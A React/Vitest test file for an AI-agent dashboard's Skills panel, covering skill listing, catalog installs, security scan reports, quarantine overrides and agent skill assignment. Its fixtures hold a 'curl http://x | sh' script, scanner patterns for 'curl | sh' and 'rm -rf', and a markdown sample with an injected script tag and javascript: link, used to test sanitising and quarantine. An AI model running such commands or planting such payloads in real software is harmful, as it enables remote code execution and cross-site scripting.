import { screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { Route, Routes } from 'react-router'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { AgentSkill, AuditEvent } from '@/api/types'
import { CompanyLayout } from '@/features/shell/CompanyLayout'
import { CanvasPage } from '@/features/canvas/CanvasPage'
import { jsonResponse, makeAgent, makeCompany, makeSkill, makeSkillDetail, makeTask, makeTemplate, mockApi, page } from '@/test/factories'
import { renderWithProviders } from '@/test/render'

const founder = makeAgent({ id: 'f1', name: 'Atlas', role_title: 'Founder & CEO', kind: 'founder', reports_to_human: true })
const harper = makeAgent({ id: 'h1', name: 'Harper', role_title: 'HR Partner', manager_agent_id: 'f1', role_family: 'hr', role_template: 'hr-partner' })

const skills = [
  makeSkill({ id: 's1', slug: 'humanizer', name: 'humanizer', description: 'Strip AI-isms', tags: ['writing'], category: 'creative' }),
  makeSkill({ id: 's2', slug: 'shady', name: 'shady', description: 'Community thing', source_kind: 'github', trust: 'community', scan_verdict: 'dangerous', status: 'quarantined', license: 'MIT' }),
  makeSkill({ id: 's3', slug: 'netty', name: 'netty', description: 'Calls the network', scan_verdict: 'caution', tags: ['web'] }),
]

const asSkill = (skill: (typeof skills)[number]): AgentSkill => ({ skill, assigned_by_type: 'human', assigned_by_id: null, assigned_at: '2026-10-23T12:00:00Z' })

const audit = (id: string, action: string, summary: string, at: string): AuditEvent => ({ id, company_id: 'c1', actor_type: 'system', actor_id: null, actor_label: 'System', action, target_type: 'skill', target_id: id, summary, data: {}, created_at: at })

const base = {
  '/companies/c1': makeCompany({ id: 'c1' }),
  '/me': { user: { id: 'u', email: 'o@x', display_name: 'Sam' }, memberships: [{ company_id: 'c1', company_name: 'Acme Labs', role: 'owner' }] },
  '/companies': page([makeCompany({ id: 'c1' })]),
  '/companies/c1/agents': page([founder, harper]),
  '/companies/c1/departments': page([]),
  '/companies/c1/activity': page([]),
  '/runtimes': { items: [] },
  '/companies/c1/skills': page(skills),
  '/companies/c1/agents/f1/skills': { items: [asSkill(skills[0]!)] },
  '/companies/c1/agents/h1/skills': { items: [asSkill(skills[0]!), asSkill(skills[2]!)] },
  '/companies/c1/role-templates': page([makeTemplate({ family: 'engineering', default_skill_slugs: ['humanizer', 'netty'] }), makeTemplate({ slug: 'hr-partner', family: 'hr', title: 'HR Partner', default_skill_slugs: ['humanizer'] })]),
}

function renderCanvas(route: string) {
  return renderWithProviders(
    <Routes>
      <Route path="/c/:companyId" element={<CompanyLayout />}>
        <Route index element={<CanvasPage />} />
      </Route>
    </Routes>,
    { route },
  )
}

afterEach(() => vi.unstubAllGlobals())

describe('Skills panel: library table', () => {
  it('lists skills with scan-verdict badges, status and the number of assigned agents', async () => {
    vi.stubGlobal('fetch', mockApi(base).impl)
    renderCanvas('/c/c1?panel=skills')
    const dialog = await screen.findByRole('dialog', { name: 'Skills' })
    const table = await within(dialog).findByRole('table')
    const rows = within(table).getAllByRole('row').slice(1)
    // Quarantined first, then the flagged one, then the rest.
    expect(rows.map((r) => within(r).getAllByRole('button')[0]!.textContent)).toEqual(['shady', 'netty', 'humanizer'])

    const shady = rows[0]!
    expect(within(shady).getByText('Dangerous')).toBeInTheDocument()
    expect(within(shady).getByText('Quarantined')).toBeInTheDocument()
    expect(within(shady).getByText('GitHub')).toBeInTheDocument()
    expect(within(rows[1]!).getByText('Caution')).toBeInTheDocument()
    expect(within(rows[2]!).getByText('Safe')).toBeInTheDocument()

    // humanizer is assigned to Atlas and Harper; netty to Harper; shady to nobody.
    await waitFor(() => expect(within(rows[2]!).getByText('2')).toBeInTheDocument())
    expect(within(rows[1]!).getByText('1')).toBeInTheDocument()
    expect(within(shady).getByText('0')).toBeInTheDocument()
    expect(within(dialog).getByText(/1 quarantined/)).toBeInTheDocument()
  })

  it('filters by search text, status, source and tag, and can clear the filters', async () => {
    vi.stubGlobal('fetch', mockApi(base).impl)
    renderCanvas('/c/c1?panel=skills')
    const dialog = await screen.findByRole('dialog', { name: 'Skills' })
    const names = () => within(dialog).getAllByRole('row').slice(1).map((r) => within(r).getAllByRole('button')[0]!.textContent)
    await within(dialog).findByRole('table')

    await userEvent.type(screen.getByLabelText('Search skills'), 'network')
    expect(names()).toEqual(['netty'])
    await userEvent.click(within(dialog).getByRole('button', { name: 'Clear' }))
    expect(names()).toHaveLength(3)

    await userEvent.selectOptions(within(dialog).getByLabelText('Status'), 'quarantined')
    expect(names()).toEqual(['shady'])
    await userEvent.selectOptions(within(dialog).getByLabelText('Status'), 'all')
    await userEvent.selectOptions(within(dialog).getByLabelText('Source'), 'github')
    expect(names()).toEqual(['shady'])
    await userEvent.selectOptions(within(dialog).getByLabelText('Source'), 'all')
    await userEvent.selectOptions(within(dialog).getByLabelText('Tag'), 'web')
    expect(names()).toEqual(['netty'])

    await userEvent.type(screen.getByLabelText('Search skills'), 'zzzz')
    expect(await within(dialog).findByText('No skills match')).toBeInTheDocument()
  })

  it('says skills are not built yet on an older backend, never an error banner', async () => {
    const { '/companies/c1/skills': _s, ...old } = base
    void _s
    vi.stubGlobal('fetch', mockApi(old).impl)
    renderCanvas('/c/c1?panel=skills')
    const dialog = await screen.findByRole('dialog', { name: 'Skills' })
    expect(await within(dialog).findByText('Skills are not built yet')).toBeInTheDocument()
    expect(within(dialog).getByText('Arrives in M4')).toBeInTheDocument()
  })
})

describe('Skills panel: catalog install', () => {
  const item = (over = {}) => ({ slug: 'pdf', name: 'pdf', description: 'Work with PDFs', tags: ['docs'], license: 'Apache-2.0', source: 'github', source_kind: 'github', source_ref: 'github:anthropics/skills@abc:skills/pdf', item_type: 'skill', installed: false, skill_id: null, status: null, stars: 1200, ...over })

  async function openCatalog(routes: Record<string, unknown>) {
    const api = mockApi({ ...base, ...routes })
    vi.stubGlobal('fetch', api.impl)
    renderCanvas('/c/c1?panel=skills')
    const dialog = await screen.findByRole('dialog', { name: 'Skills' })
    await userEvent.click(within(dialog).getByRole('tab', { name: /Find/ }))
    return { api, dialog }
  }

  it('installs and shows license, trust and scan outcome including quarantine', async () => {
    const installed = makeSkill({ id: 'n1', slug: 'pdf', license: 'Apache-2.0', trust: 'trusted', scan_verdict: 'caution', status: 'active' })
    const { api, dialog } = await openCatalog({
      '/companies/c1/skills/catalog': page([item()]),
      'POST /companies/c1/skills/install': () => jsonResponse({ skill: { ...installed, trust: 'community', status: 'quarantined' }, outcome: 'installed', quarantined: true, scan: {} }, 201),
    })
    await userEvent.click(await within(dialog).findByRole('button', { name: 'Install' }))
    const status = await within(dialog).findByRole('status')
    expect(within(status).getByText('Installed, but quarantined')).toBeInTheDocument()
    expect(status).toHaveTextContent('License: Apache-2.0')
    expect(status).toHaveTextContent(/Scan: caution/)
    expect(status).toHaveTextContent(/no agent can use it/)
    expect(api.calls.find((c) => c.method === 'POST')?.body).toEqual({ source_ref: 'github:anthropics/skills@abc:skills/pdf' })
    expect(within(dialog).getByRole('button', { name: 'Installed' })).toBeDisabled()
  })

  it("shows the server's refusal reason when an install is refused", async () => {
    const { dialog } = await openCatalog({
      '/companies/c1/skills/catalog': page([item({ license: null })]),
      'POST /companies/c1/skills/install': () => jsonResponse({ error: { code: 'license_not_allowed', message: 'License "Complete terms in LICENSE.txt" is not an allowed open-source license', details: null } }, 422),
    })
    expect(await within(dialog).findByText('No license found')).toBeInTheDocument()
    await userEvent.click(await within(dialog).findByRole('button', { name: 'Install' }))
    const alert = await within(dialog).findByRole('alert')
    expect(alert).toHaveTextContent(/Not installed/)
    expect(alert).toHaveTextContent(/not an allowed open-source license/)
    expect(alert).toHaveTextContent(/license_not_allowed/)
    expect(within(dialog).getByRole('button', { name: 'Install' })).toBeEnabled() // can retry
  })

  it('has a GitHub source that waits for a query, and browses a repository result', async () => {
    const calls: string[] = []
    const { dialog } = await openCatalog({
      '/companies/c1/skills/catalog': (url: URL) => {
        calls.push(url.search)
        const q = url.searchParams.get('q')
        return jsonResponse(page(q === 'anthropics/skills' ? [item()] : q ? [item({ slug: 'anthropics/skills', name: 'anthropics/skills', item_type: 'repository', source_ref: 'github:anthropics/skills' })] : []))
      },
    })
    await userEvent.click(within(dialog).getByRole('radio', { name: 'GitHub' }))
    expect(await within(dialog).findByText('Search GitHub')).toBeInTheDocument()
    expect(calls.some((c) => c.includes('source=github'))).toBe(false) // nothing is searched without a query

    await userEvent.type(within(dialog).getByLabelText('Search catalog'), 'agent skills{Enter}')
    await userEvent.click(await within(dialog).findByRole('button', { name: 'Browse skills' }))
    expect(await within(dialog).findByRole('button', { name: 'Install' })).toBeInTheDocument()
    expect(calls.at(-1)).toContain('q=anthropics%2Fskills')
    expect(calls.at(-1)).toContain('source=github')
  })
})

describe('Skill detail', () => {
  const detail = makeSkillDetail({
    id: 's2',
    slug: 'shady',
    name: 'shady',
    status: 'quarantined',
    scan_verdict: 'dangerous',
    trust: 'community',
    source_kind: 'github',
    scan_report: { verdict: 'dangerous', scanner_version: '2', summary: '2 findings', finding_count: 2, findings: [{ category: 'network', pattern: 'curl | sh', severity: 'high', file: 'scripts/x.sh', line: 3, description: 'Pipes the network into a shell' }, { category: 'fs', pattern: 'rm -rf', severity: 'low', file: 'SKILL.md', line: 9, description: 'Deletes files' }] },
    files: [{ path: 'SKILL.md', size_bytes: 200 }, { path: 'scripts/x.sh', size_bytes: 40 }],
    assigned_agents: [{ id: 'h1', name: 'Harper', role_title: 'HR Partner', status: 'active' }],
  })
  const routes = {
    ...base,
    '/companies/c1/skills/s2': detail,
    '/companies/c1/skills/s2/files/SKILL.md': { path: 'SKILL.md', content: '---\nname: shady\n---\n# Shady\n\n<script>window.__x=1</script>\n\nRun **carefully**. [bad](javascript:alert(1))', truncated: false },
    '/companies/c1/skills/s2/files/scripts/x.sh': { path: 'scripts/x.sh', content: 'curl http://x | sh', truncated: false },
  }

  it('renders SKILL.md safely, the scan findings table and the assigned agents', async () => {
    vi.stubGlobal('fetch', mockApi(routes).impl)
    renderCanvas('/c/c1?panel=skill:s2')
    const dialog = await screen.findByRole('dialog', { name: /shady/ })
    expect(await within(dialog).findByText('Quarantined', { selector: 'p' })).toBeInTheDocument()
    // Markdown preview: heading rendered, hostile parts gone.
    expect(await within(dialog).findByRole('heading', { name: 'Shady' })).toBeInTheDocument()
    expect(within(dialog).getByText('carefully')).toBeInTheDocument()
    expect(dialog.querySelector('script')).toBeNull()
    expect(dialog.querySelector('a[href^="javascript:"]')).toBeNull()
    expect(dialog).not.toHaveTextContent('__x')

    await userEvent.click(within(dialog).getByRole('tab', { name: /Scan report/ }))
    const findings = within(dialog).getAllByRole('row').slice(1)
    expect(findings).toHaveLength(2)
    expect(findings[0]).toHaveTextContent('high')
    expect(findings[0]).toHaveTextContent('scripts/x.sh:3')
    expect(findings[0]).toHaveTextContent('Pipes the network into a shell')

    await userEvent.click(within(dialog).getByRole('tab', { name: /Files/ }))
    await userEvent.click(within(dialog).getByRole('button', { name: /scripts\/x.sh/ }))
    expect(await within(dialog).findByLabelText('Contents of scripts/x.sh')).toHaveTextContent('curl http://x | sh')

    await userEvent.click(within(dialog).getByRole('tab', { name: /Agents/ }))
    expect(within(dialog).getByText('Harper')).toBeInTheDocument()
  })

  it('requires an explicit acknowledgement before overriding the scanner, then posts the override', async () => {
    const api = mockApi({ ...routes, 'POST /companies/c1/skills/s2/unquarantine': { ...makeSkill({ id: 's2' }), status: 'active' } })
    vi.stubGlobal('fetch', api.impl)
    renderCanvas('/c/c1?panel=skill:s2')
    const panel = await screen.findByRole('dialog', { name: /shady/ })
    await userEvent.click(await within(panel).findByRole('button', { name: /Unquarantine/ }))
    const confirm = await screen.findByRole('dialog', { name: /Unquarantine shady\?/ })
    expect(confirm).toHaveTextContent(/overrides the security scanner/)
    expect(confirm).toHaveTextContent(/dangerous/)
    expect(confirm).toHaveTextContent(/audit log/)
    const go = within(confirm).getByRole('button', { name: /Override scanner/ })
    expect(go).toBeDisabled()
    await userEvent.click(within(confirm).getByRole('checkbox'))
    await userEvent.type(within(confirm).getByRole('textbox'), 'reviewed the script')
    await userEvent.click(go)
    await waitFor(() => expect(api.calls.find((c) => c.path.endsWith('/unquarantine'))?.body).toEqual({ note: 'reviewed the script' }))
  })

  it('offers no unquarantine for an active skill', async () => {
    vi.stubGlobal('fetch', mockApi({ ...routes, '/companies/c1/skills/s2': { ...detail, status: 'active', scan_verdict: 'safe' } }).impl)
    renderCanvas('/c/c1?panel=skill:s2')
    const dialog = await screen.findByRole('dialog', { name: /shady/ })
    await within(dialog).findByRole('button', { name: 'Archive' })
    expect(within(dialog).queryByRole('button', { name: /Unquarantine/ })).not.toBeInTheDocument()
  })
})

describe('Skills widget', () => {
  it('summarises the library, hiring requests, role families and collapsed HR activity', async () => {
    const installs = Array.from({ length: 12 }, (_, i) => audit(`i${i}`, 'skill.installed', `Installed skill s${i}`, `2026-10-23T12:00:${String(i).padStart(2, '0')}Z`))
    vi.stubGlobal(
      'fetch',
      mockApi({
        ...base,
        '/companies/c1/activity': page([audit('h', 'hire.created', 'Harper hired Sam', '2026-10-23T13:00:00Z'), ...installs]),
        '/companies/c1/tasks': page([makeTask({ id: 't1', kind: 'hiring', status: 'in_progress', title: 'Hire a designer' }), makeTask({ id: 't2', kind: 'hiring', status: 'done', title: 'Old hire' }), makeTask({ id: 't3', kind: 'work', title: 'Not hiring' })]),
      }).impl,
    )
    renderCanvas('/c/c1')
    const widget = await screen.findByRole('region', { name: 'Skills' })
    await within(widget).findByText('Quarantined')
    expect(within(widget).getByText('Need review').previousSibling).toHaveTextContent('1') // netty (caution)
    expect(within(widget).getByText('Quarantined').previousSibling).toHaveTextContent('1')
    expect(within(widget).getByText(/1 skill is quarantined/)).toBeInTheDocument()

    const hiring = within(widget).getByRole('region', { name: 'Open hiring requests' })
    expect(await within(hiring).findByText('Hire a designer')).toBeInTheDocument()
    expect(within(hiring).queryByText('Old hire')).not.toBeInTheDocument()
    expect(within(hiring).queryByText('Not hiring')).not.toBeInTheDocument()

    const families = within(widget).getByRole('region', { name: 'Skills by role family' })
    expect(await within(families).findByText('Engineering')).toBeInTheDocument()
    expect(within(families).getByText('People & HR')).toBeInTheDocument()

    const recent = within(widget).getByRole('region', { name: 'Recent HR activity' })
    expect(await within(recent).findByText('Harper hired Sam')).toBeInTheDocument()
    expect(within(recent).getByText('12 skills installed')).toBeInTheDocument()
  })

  it('opens the Skills panel from the expand button', async () => {
    vi.stubGlobal('fetch', mockApi(base).impl)
    renderCanvas('/c/c1')
    const widget = await screen.findByRole('region', { name: 'Skills' })
    await userEvent.click(within(widget).getByRole('button', { name: 'Open skills' }))
    expect(await screen.findByRole('dialog', { name: 'Skills' })).toBeInTheDocument()
  })
})

describe('Agent panel: Skills tab and header', () => {
  it('shows role family and template in the header and the assigned skills with a working remove', async () => {
    const api = mockApi({ ...base, '/companies/c1/agents/h1': harper, 'DELETE /companies/c1/agents/h1/skills/s3': undefined })
    vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
      const path = new URL(typeof input === 'string' ? input : input instanceof URL ? input.href : input.url, 'http://localhost').pathname
      if (init?.method === 'DELETE' && path === '/api/companies/c1/agents/h1/skills/s3') {
        api.calls.push({ method: 'DELETE', path: path.replace('/api', ''), body: undefined })
        return new Response(null, { status: 204 })
      }
      return api.impl(input, init)
    })
    renderCanvas('/c/c1?panel=agent:h1')
    const dialog = await screen.findByRole('dialog', { name: /Harper/ })
    expect(within(dialog).getAllByText('People & HR').length).toBeGreaterThan(0)
    expect(within(dialog).getByText('hr-partner')).toBeInTheDocument()

    await userEvent.click(await within(dialog).findByRole('tab', { name: 'Skills' }))
    expect(await within(dialog).findByText('netty')).toBeInTheDocument()
    expect(within(dialog).getByText('humanizer')).toBeInTheDocument()
    await userEvent.click(within(dialog).getByRole('button', { name: 'Remove netty' }))
    await waitFor(() => expect(api.calls.some((c) => c.method === 'DELETE' && c.path === '/companies/c1/agents/h1/skills/s3')).toBe(true))
  })

  it('adds skills from the picker, which offers only active skills the agent lacks', async () => {
    const api = mockApi({ ...base, '/companies/c1/agents/f1': founder, 'POST /companies/c1/agents/f1/skills': { items: [] } })
    vi.stubGlobal('fetch', api.impl)
    renderCanvas('/c/c1?panel=agent:f1')
    const panel = await screen.findByRole('dialog', { name: /Atlas/ })
    await userEvent.click(await within(panel).findByRole('tab', { name: 'Skills' }))
    await within(panel).findByText('humanizer')
    await userEvent.click(within(panel).getByRole('button', { name: 'Add skills' }))
    const picker = await screen.findByRole('dialog', { name: /Add skills to Atlas/ })
    const list = await within(picker).findByRole('list', { name: 'Available skills' })
    // humanizer is assigned and shady is quarantined: only netty can be added.
    expect(within(list).getAllByRole('listitem')).toHaveLength(1)
    expect(within(list).getByText('netty')).toBeInTheDocument()
    expect(within(list).getByText('Caution')).toBeInTheDocument()
    await userEvent.click(within(list).getByRole('checkbox'))
    await userEvent.click(within(picker).getByRole('button', { name: /Add 1 skill/ }))
    await waitFor(() => expect(api.calls.find((c) => c.method === 'POST')?.body).toEqual({ skill_ids: ['s3'] }))
  })

  it('says when nothing is left to add', async () => {
    vi.stubGlobal('fetch', mockApi({ ...base, '/companies/c1/agents/h1': harper }).impl)
    renderCanvas('/c/c1?panel=agent:h1')
    const panel = await screen.findByRole('dialog', { name: /Harper/ })
    await userEvent.click(await within(panel).findByRole('tab', { name: 'Skills' }))
    await within(panel).findByText('netty')
    await userEvent.click(within(panel).getByRole('button', { name: 'Add skills' }))
    const picker = await screen.findByRole('dialog', { name: /Add skills to Harper/ })
    expect(await within(picker).findByText('Nothing left to add')).toBeInTheDocument()
  })
})
